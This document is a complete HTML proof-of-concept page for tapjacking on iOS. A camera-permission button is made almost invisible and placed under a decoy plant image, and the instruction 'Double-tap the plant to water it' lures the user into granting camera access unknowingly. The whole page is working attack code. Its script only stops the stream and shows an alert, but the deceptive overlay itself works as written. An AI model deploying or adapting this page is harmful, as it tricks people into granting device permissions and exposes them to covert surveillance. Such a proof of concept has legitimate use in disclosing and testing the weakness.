<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>iOS Permission Tapjacking PoC</title>

<style>
  body {
    margin:0;
    height:100vh;
    background:#111;
    color:#fff;
    font-family:-apple-system,system-ui,sans-serif;
    overflow:hidden;
  }

  #instructions {
    position:absolute;
    top:30%;
    left:50%;
    transform:translateX(-50%);
    font-size:18px;
    text-align:center;
    width:90%;
  }

  /* 🔴 REAL permission button (hidden intent) */
  #real {
    position:absolute;
    top:55%;
    left:50%;
    transform:translateX(-50%);
    width:280px;
    height:56px;
    font-size:18px;
    z-index:1;
    opacity:0.01; /* visually hidden but clickable */
  }

  /* 🪞 DECOY visual */
  #decoy {
    position:absolute;
    top:65%;
    left:50%;
    transform:translateX(-50%) rotateX(180deg);
    width:280px;
    height:56px;
    background:#fff;
    color:#000;
    font-size:22px;
    display:flex;
    align-items:center;
    justify-content:center;
    -webkit-box-reflect: above 0;
    pointer-events:none;
    border-radius:12px;
  }
</style>
</head>

<body>

<div id="instructions">
  🌱 Double‑tap the plant to water it 💧
</div>

<button id="real">Allow camera</button>
<div id="decoy">🌱</div>

<script>
document.getElementById("real").onclick = async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
    stream.getTracks().forEach(t => t.stop());
    alert("Camera permission GRANTED");
  } catch {
    alert("Permission denied");
  }
};
</script>

</body>
</html>
